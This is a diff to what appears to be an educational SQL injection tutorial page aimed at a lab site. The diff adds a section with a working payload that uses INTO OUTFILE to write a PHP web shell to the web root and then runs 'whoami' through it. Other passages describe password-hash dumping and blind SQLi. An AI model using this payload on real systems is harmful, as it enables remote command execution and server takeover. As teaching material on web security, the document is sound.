@@ -138,6 +138,8 @@ This vulnerable page can be interacted with at `http://sqli.com/search.php`:
 
 <figure><img src="../../.gitbook/assets/SQLi-AE_UnionExamplePage.png" alt=""><figcaption><p>Customer search portal</p></figcaption></figure>
 
+### Data Leakage
+
 After determining this page is vulnerable to SQLi, the first step is to determine the exact number of columns present in the database. This is done with the `ORDER BY` operator:
 
 ```sql
@@ -188,6 +190,26 @@ From here any interesting tables can be enumerated:
 
 Resulting in the hash of the all user passwords.
 
+### Executable Implantation
+
+This portion of the example will leverage the `INTO OUTFILE` operator in order to write the output of the query into a file.
+
+As seen in error messages in earlier examples, the web application is running at `/var/www/html`. With that in mind, the output of this command will be written (in PHP) to a sub-directory, `/var/www/html/tmp/`:
+
+{% code overflow="wrap" %}
+```sql
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+{% endcode %}
+
+While the command itself throws an error:
+
+<figure><img src="../../.gitbook/assets/SQLi-AE_UnionWebShellImplant.png" alt=""><figcaption><p>Error thrown when implanting executable</p></figcaption></figure>
+
+Navigating to the URL `http://sqli.com/tmp/webshell.php?cmd=whoami` yields the following page indicating the web shell has been implanted and is working properly:
+
+
+
 ## Blind SQLi
 
 The SQLi payloads above are all **in-band**, meaning attackers are able to retrieve the database content of their query inside the web application.
@@ -218,7 +240,7 @@ Since `1=1` will always be `TRUE`, the application will return the values only i
 
 <figure><img src="../../.gitbook/assets/SQLi-AE_BlindBoolValidUser.png" alt=""><figcaption><p>Valid user with boolean payload</p></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption><p>Non-existent user (username: "test") with boolean payload</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SQLi-AE_BlindBoolInvalidUser.png" alt=""><figcaption><p>Non-existent user (username: "test") with boolean payload</p></figcaption></figure>
 
 Using this syntax, one could enumerate the entire database for other usernames or even extend the SQL query to verify data in other tables.
 
@@ -234,4 +256,4 @@ In this instance, the attacker appended an `IF` condition that will always be tr
 
 This time the results are not visual in the application. Instead it is about whether the application hangs (as the `sleep(3)` command executes). If the URL above is used with a valid user (`admin`), the application will hang for about 3 seconds upon navigating to the page. However if the user is invalid (`test`), the page will load immediately.
 
-This timing difference can also be utillized to enumerate data present in the database (through trial and error). Because of the tediousness, this process is often not done manually but rather automated through tools (e.g. sqlmap).
+This timing difference can also be utilized to enumerate data present in the database (through trial and error). Because of the tediousness, this process is often not done manually but rather automated through tools (e.g. sqlmap).
